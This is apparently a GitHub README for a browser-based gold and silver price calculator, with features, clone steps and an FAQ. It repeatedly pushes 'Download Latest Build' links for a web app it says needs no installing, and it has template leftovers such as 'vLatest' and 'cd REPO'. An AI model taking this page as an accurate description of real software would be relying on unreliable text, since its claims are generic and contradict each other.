# GoldPriceTools vLatest - Precious Metals Calculator 2026

> **GoldPriceTools is a browser-based precious metals calculator in version Latest, combining live gold and silver spot rates, multi-purity valuation, and responsive pricing tools.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brandon-hall21/goldpricetools-spot-price-tools?style=flat-square)](https://github.com/brandon-hall21/goldpricetools-spot-price-tools)

---

<p align="center">
  <a href="https://brandon-hall21.github.io/goldpricetools-spot-price-tools/">
    <img src="https://img.shields.io/badge/Download-GoldPriceTools%20Latest-brightgreen?style=for-the-badge" alt="Download GoldPriceTools">
  </a>
</p>

> **[Download Latest Build - GoldPriceTools vLatest](https://brandon-hall21.github.io/goldpricetools-spot-price-tools/)**

---

[Download Latest Build](https://brandon-hall21.github.io/goldpricetools-spot-price-tools/)

---

## Overview

GoldPriceTools is made for quick precious-metals pricing in the browser. It pulls together live gold and silver spot values, purity-aware calculators, and conversion utilities in one interface that stays usable on both desktop and mobile screens.

It fits common valuation workflows like estimating scrap gold, pricing gold bars, converting between weight units, and comparing outputs across currencies. The project also ships with web-focused delivery pieces such as PWA support, SEO metadata, and a deployment path oriented around Cloudflare-based hosting.

---

## Features

- Live gold and silver spot prices with automatic refresh
- Gold calculator for 8K through 24K purity levels
- Silver calculator for .999, 925, .900, and .800 grades
- Scrap gold valuation and gold bar value calculations
- 10-year price charts powered through a Cloudflare Worker proxy
- Weight conversion for troy ounces, grams, kilograms, pennyweight, and grains
- Dark and light appearance modes
- Mobile-first layout with WCAG 2.1 accessibility support
- SEO schema markup and image sitemap support
- PWA manifest support for installable web use

---

## Installation

GoldPriceTools is a web application, so setup usually means either hosting the static files yourself or deploying them on a compatible web platform.

Clone the repository and open the project locally:

git clone https://github.com/brandon-hall21/goldpricetools-spot-price-tools.git
cd REPO

After that, serve the files with your preferred local web server, or publish the site to Cloudflare Pages if you are using the included web hosting workflow. If your deployment relies on a Cloudflare Worker proxy for chart data, configure that worker before you go live.

---

## Usage

Load the site in your browser and pick the calculator that matches the job at hand:

- Select a metal type, purity, and currency to estimate value
- Enter weight in the units you want to compare
- Review live spot-based pricing and chart history
- Switch between light and dark mode as needed
- Install the PWA on supported devices for quicker access

If you are evaluating mixed items, the scrap gold and bar value tools can be used to compare jewelry and bullion against current market prices.

---

## Configuration

Most configuration lives in the site files and the deployment environment.

Typical areas to review include:

- Spot-price update behavior
- Currency display options
- Chart data proxy endpoint for the Cloudflare Worker
- PWA manifest details
- SEO metadata and sitemap assets
- Theme settings for dark and light mode

When self-hosting, inspect the HTML and related web assets before publishing so the site matches your preferred branding and runtime setup.

---

## Requirements

- A modern web browser
- Static web hosting or a Cloudflare Pages compatible deployment
- Optional: Cloudflare Worker for chart proxying
- Optional: a PWA-capable device for install support
- Internet access for live pricing data

---

## FAQ

**Does it need to be installed as a desktop app?**  
No. GoldPriceTools runs as a web app directly in the browser.

**How are prices updated?**  
It uses live spot pricing with automatic refresh behavior.

**Can I change the appearance?**  
Yes. The interface supports both dark and light modes.

**Where do chart prices come from?**  
The long-term chart feature uses a Cloudflare Worker proxy in the intended deployment flow.

**What if a calculation looks incorrect?**  
Confirm the chosen purity, currency, and weight unit, and make sure the live spot source is reachable in your deployment.

**Is the project suitable for mobile devices?**  
Yes. The layout is responsive and intended for mobile use.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
